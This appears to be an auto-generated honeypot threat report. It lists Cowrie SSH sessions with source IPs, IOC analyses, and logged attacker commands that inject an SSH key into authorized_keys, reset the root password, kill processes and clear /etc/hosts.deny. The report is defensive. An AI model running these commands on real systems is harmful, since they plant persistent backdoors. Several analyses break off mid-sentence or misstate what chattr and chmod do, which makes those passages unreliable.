- RSA public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"**.  
- Commands targeting `/etc/hosts.deny` and process killing (`pkill -9`).  

**Threat Level:** **High** – attacker achieved root-level access, enabling full control of the system.

**Brief Summary:** The attacker installed a backdoor by injecting an SSH key into `.ssh/authorized_keys`, changing the root password, and disabling host denial mechanisms, thereby gaining privileged remote access to the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:MdKEjmdCh7DF"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 6e138d32065a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 185.203.236.212

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote shell access by adding a malicious SSH key and resetting the root password.  
**Techniques:**  
- `chattr -ia` / `lockr` to lock `.ssh` directory, then overwrite it with a new key.  
- `echo … > .ssh/authorized_keys` – injects an RSA public key.  
- `chmod -R go= ~/.ssh` – removes read/write permissions for others.  
- `chpasswd` to set root password (`9Ap7HMsX7hQ1`).  
- System‑info commands (CPU, memory, uname) used for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+r

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:9Ap7HMsX7hQ1"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: af9985e776c5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 187.110.238.50

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent remote access via SSH by adding an RSA key and resetting the root password.  
**Techniques:**  
- Manipulation of `.ssh` directory (chmod, lockr) to prevent detection.  
- Injection of a new `authorized_keys` entry with a hard‑coded RSA public key.  
- Root password reset (`chpasswd`).  
- Process killing (`pkill -9`) and clearing `/etc/hosts.deny` to hide activity.  
- System reconnaissance (CPU, memory, filesystem, crontab, user info).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 187.110.238.50  
- RSA key string in `.ssh/authorized_keys` (public‑key hash can be derived).  
- Modified file paths: `~/.ssh`, `/etc/hosts.deny`.  

**Threat Level:** **High** – root password change and SSH backdoor provide full system control.  

**Brief Summary:** The attacker injected a new SSH key, reset the root password, and performed system reconnaissance to establish a persistent remote access point.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:GGQs6iFlHwwf"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
... (+10 more)
```

---

### Pattern: 64d1f1910683...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 41.58.186.130

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  
**Objective:** Gain remote access to the machine and gather system information.  
**Techniques:**  
- Manipulation of `.ssh` directory (chattr, lockr) to make it immutable.  
- Creation of `authorized_keys` with a public RSA key.  
- Permission changes (`chmod -R go= ~/.ssh`).  
- Attempted password change via piped input to `passwd`.  
- System‑info commands: CPU, memory, ls, crontab, uname, whoami, lscpu, df.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **41.58.186.130** (Nigeria).  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...`.  
- File path: `.ssh/authorized_keys`.  

**Threat Level:** Medium – the attacker successfully installed a backdoor and performed basic reconnaissance.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `authorized_keys` file, made the `.ssh` directory immutable, attempted to change the local password, and collected system information for potential future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nCGlADoBK9MXz\nCGlADoBK9MXz"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nCGlADoBK9MXz\nCGlADoBK9MXz\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 65bdd9d4e20a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 185.203.236.212

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain persistent remote access by injecting an SSH key and resetting the root password, while collecting system information for further exploitation.  

**Techniques Used:**
- **SSH Key Injection** – `echo "ssh-rsa …" > ~/.ssh/authorized_keys`  
- **Root Password Reset** – `chpasswd` with a random string (`root:xmj7epshHGcz`)  
- **Process Termination & Host Deny** – `pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep`  
- **System Reconnaissance** – CPU, memory, disk usage, crontab, uptime, uname, whoami, etc.  

**Indicators of Compromise (IOCs):**
- Attacker IP: `185.203.236.212` (Uzbekistan)  
- Public SSH key in authorized_keys: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:xmj7epshHGcz"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: fb30848eb26a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.172.205.208

#### Analysis

**Attack Type:** Backdoor installation / privileged access takeover  
**Objective:** Gain remote, root‑level control of the honeypot by installing an SSH key and resetting the root password.  
**Techniques:**  
- **SSH Key Injection** – created `.ssh/authorized_keys` with a hard‑coded RSA public key.  
- **Root Password Reset** – used `chpasswd` to set a new root password (`root:B5A6MBnKS58M`).  
- **Process & System Modification** – killed suspicious processes, cleared `/tmp` files, added an entry to `/etc/hosts.deny`, and altered file permissions.  
- **Reconnaissance** – executed various system‑info commands (CPU, memory, uptime) to gather host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: `103.172.205.208` (Indonesia).  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `root:B5A6MBnKS58M`.  

**Threat Level:** **High** – the attacker achieved privileged access and could execute arbitrary commands or exfiltrate data.  

**Brief Summary:** The attacker installed a hard‑coded SSH key, reset the root password, and performed system modifications to establish a persistent backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:B5A6MBnKS58M"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: cfcfe7e639a4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.163.173

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Establish remote access (SSH) and elevate privileges (root password).  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`) to hide/secure the key file.  
- Injection of a new SSH public key into `authorized_keys`.  
- Resetting root password via `chpasswd`.  
- Killing suspicious processes and disabling host denial (`echo > /etc/hosts.deny`).  
- System reconnaissance (CPU, memory, OS, disk usage).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.163.173** (Singapore)  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Root password: `root:aSlsLktBEIJa`

**Threat Level:** Medium – moderate sophistication with potential for persistent remote access.  

**Brief Summary:** The attacker injected a new SSH key and reset the root password, while gathering system information to facilitate further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:aSlsLktBEIJa"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+7 more)
```

---

### Pattern: add707add515...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.231.14.54

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise (attempt to gain root access on the honeypot).

**2. Objective:**  
Create a persistent remote entry point by adding an SSH public key to `authorized_keys` and setting the root password, while gathering system information for reconnaissance.

**3. Techniques & Tools Used:**  
- **SSH Key Injection**: `echo ... > ~/.ssh/authorized_keys` with a random RSA key.  
- **Password Reset**: `chpasswd` to set root password (`root:c6b9ymVnOd3A`).  
- **File Manipulation**: `rm -rf`, `mkdir`, permission changes (`chmod -R go= ~/.ssh`).  
- **Process Termination & Hiding**: `pkill -9 secure.sh, auth.sh, sleep`.  
- **System Information Gathering**: commands like `cat /proc/cpuinfo`, `free -m`, `uname`, `lscpu`, `df -h`.

**4. Indicators of Compromise (IOCs):**  
- Attacker IP: **103.231.14.54** (Hong Kong).  
- RSA public key string in command 3 (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- File names manipulated: `.ssh`, `/tmp/secure.sh`, `/tmp/auth.sh`.  

**5. Threat Level:** **Medium‑High** – root access and SSH key injection pose significant risk.

**6. Brief Summary:**  
The attacker injected an SSH key and reset the root password to establish a backdoor, while collecting system details for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:c6b9ymVnOd3A"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
... (+10 more)
```

---

### Pattern: 76e3763066c4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 185.203.236.212

#### Analysis

**Attack Type:**  
Backdoor installation with credential compromise (root password change + malicious SSH key injection) coupled with reconnaissance.

**Objective:**  
Gain privileged access on the host, establish remote control via an injected SSH key, and collect system details for further exploitation or profiling.

**Techniques & Tools Used:**
- `chpasswd` to alter root password.
- `echo … > ~/.ssh/authorized_keys` to inject a public SSH key (with appended “mdrfckr”).
- `chmod -R go= ~/.ssh` to restrict group access.
- `lockr -ia .ssh` (likely a tool to lock the `.ssh` directory, making it immutable).
- Process killing (`pkill -9`) and removal of temporary scripts (`rm -rf /tmp/secure.sh`, `/tmp/auth.sh`).
- System information gathering via `/proc/cpuinfo`, `free`, `top`, `uname`, `lscpu`, `df`.

**Indicators of Compromise (IOCs):**
- Attacker IP: **185.203.236.212**  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nyl

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:aZ0oVpbHsCC3"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
... (+10 more)
```

---

### Pattern: 3db5a53abe6a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 14.103.122.215

#### Analysis

**Attack Type:**  
- **SSH backdoor installation & reconnaissance**

**Objective:**  
- Gain remote SSH access to the honeypot by inserting a malicious RSA key into `authorized_keys` and changing the local user’s password.  
- Gather basic system information (CPU model, OS details, disk usage) for further exploitation or profiling.

**Techniques / Tools Used:**
1. **File attribute manipulation (`chattr`, `lockr`)** – attempts to hide or lock the `.ssh` directory.
2. **SSH key injection** – writes a hard‑coded RSA public key into `authorized_keys`.
3. **Permission changes (`chmod -R go=`)** – removes read/write permissions for others on `.ssh`.
4. **Password change via `passwd`** – sets a new password to facilitate remote login.
5. **System reconnaissance commands** – `cat /proc/cpuinfo`, `uname`, `lscpu`, `top`, `df`.

**Indicators of Compromise (IOCs):**
- Attacker IP: **14.103.122.215**  
- RSA public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "yuxiang\ndnKMxt0fJCiU\ndnKMxt0fJCiU"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "yuxiang\ndnKMxt0fJCiU\ndnKMxt0fJCiU\n"|passwd
top
uname
... (+4 more)
```

---

### Pattern: 86f6cf409843...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.172.205.208

#### Analysis

**Attack Type:**  
Backdoor installation / remote control (botnet recruitment)

**Objective:**  
Gain persistent SSH access with a custom key and elevate to root privileges; gather system information for further exploitation or profiling.

**Techniques & Tools:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys` with an RSA public key.
- **Permission Manipulation** – `chmod -R go= ~/.ssh`.
- **Root Password Reset** – `chpasswd` to set root password (`ldcyHEDpiDFF`).
- **Process Termination & Host Deny Modification** – `pkill`, `echo > /etc/hosts.deny`.
- **System Reconnaissance** – CPU, memory, uptime, uname, crontab, etc.

**Indicators of Compromise (IOCs):**
- Attacker IP: 103.172.205.208  
- RSA public key string (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).
- File paths: `.ssh/authorized_keys`, `/etc/hosts.deny`.
- Root password value: `ldcyHEDpiDFF`.

**Threat Level:** High – attacker achieved root access and installed a persistent backdoor, posing significant risk.

**Brief Summary:**  
The session shows an attacker installing an SSH backdoor with a custom key, resetting the root password, and gathering system details to facilitate further exploitation or botnet recruitment.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ldcyHEDpiDFF"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 3edcb428f175...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 185.203.236.212

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection with reconnaissance.

**Objective:**  
Gain remote SSH access to the honeypot and gather system details (CPU, memory, filesystem) for future exploitation or botnet recruitment.

**Techniques & Tools Used:**
- `lockr -ia .ssh` – likely a tool to lock file attributes.
- Creation of `.ssh/authorized_keys` with a malicious RSA key.
- `chmod -R go= ~/.ssh` – set permissions to allow group and others access.
- System‑info commands (`cat /proc/cpuinfo`, `free -m`, `ls`, `crontab`, `uname`, `whoami`, `lscpu`, `df`) for reconnaissance.

**Indicators of Compromise (IOCs):**
- Attacker IP: **185.203.236.212**  
- Malicious SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `.ssh/authorized_keys`  

**Threat Level

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nX94JinuWnSHD\nX94JinuWnSHD"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nX94JinuWnSHD\nX94JinuWnSHD\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 87c7aa4420d0...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.231.14.54

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection)  
**Objective:** Gain persistent remote access via SSH and gather basic system information for later use.  

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` to set immutable attributes on `.ssh`, preventing tampering.
- Removal of existing `.ssh` directory, creation of a new one with an injected RSA key in `authorized_keys`.
- System reconnaissance commands (`cat /proc/cpuinfo`, `free -m`, `df -h`, `uname`, `whoami`, etc.) to collect CPU, memory, disk, and OS details.  

**Indicators of Compromise (IOCs):**
- Attacker IP: **103.231.14.54**  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun..."` (public key)  
- File path: `~/.ssh/authorized_keys`  

**Threat Level:** Medium – the attacker establishes a backdoor but does not deploy additional payloads or malware.  

**Brief Summary:** The session shows an attacker injecting a new SSH key into the host’s authorized keys, setting immutable attributes to protect it, and performing basic system reconnaissance to prepare for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nkiTuSJkv3uAw\nkiTuSJkv3uAw"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nkiTuSJkv3uAw\nkiTuSJkv3uAw\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 57aea6d23739...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.217.205

#### Analysis

**1. Attack Type**  
Backdoor installation (remote privileged access)

**2. Objective**  
Gain persistent, privileged SSH access to the system by installing a custom SSH key and resetting the root password.

**3. Techniques & Tools Used**  
- `chattr`/`lockr` to lock the `.ssh` directory  
- Creation of `/home/.ssh/authorized_keys` with an injected RSA public key  
- `chmod -R go= ~/.ssh` to restrict permissions  
- `chpasswd` to set a new root password (`root:EyoaDcQ8z1ll`)  
- Killing processes (`pkill -9 secure.sh`, `pkill -9 auth.sh`, `pkill -9 sleep`) and clearing `/etc/hosts.deny` to hide activity  
- System reconnaissance commands (`cpuinfo`, `free`, `ls`, `crontab`, `top`, `uname`, etc.) to gather host details

**4. Indicators of Compromise (IOCs)**  
- **IP:** 45.78.217.205 (Singapore)  
- **SSH Key:** `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- **File Names:** `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`, `etc/hosts.deny`

**5. Threat Level**  
High – the attacker is attempting to establish a persistent, privileged backdoor with root access.

**6. Brief Summary**  
The attacker injected an SSH key and reset the root password on the Cowrie honeypot, aiming to gain remote privileged access while hiding activity by killing processes and modifying permissions.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:EyoaDcQ8z1ll"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+8 more)
```

---

### Pattern: 19ddcdf25543...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.224.217

#### Analysis

**1. Attack Type:**  
Backdoor installation (remote shell access via SSH key injection).

**2. Objective:**  
Gain persistent privileged access on the target system by adding an authorized SSH key and resetting the root password.

**3. Techniques & Tools Used:**
- `chattr`, `lockr` to lock `.ssh` directory.
- Creation of a new `.ssh` folder, echoing a hard‑coded RSA public key into `authorized_keys`.
- `chmod -R go= ~/.ssh` to restrict permissions.
- `echo "root:oiI5p4lPeiK2"|chpasswd|bash` to set the root password.
- Process termination (`pkill -9`) and modification of `/etc/hosts.deny` to block unwanted connections.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.224.217**  
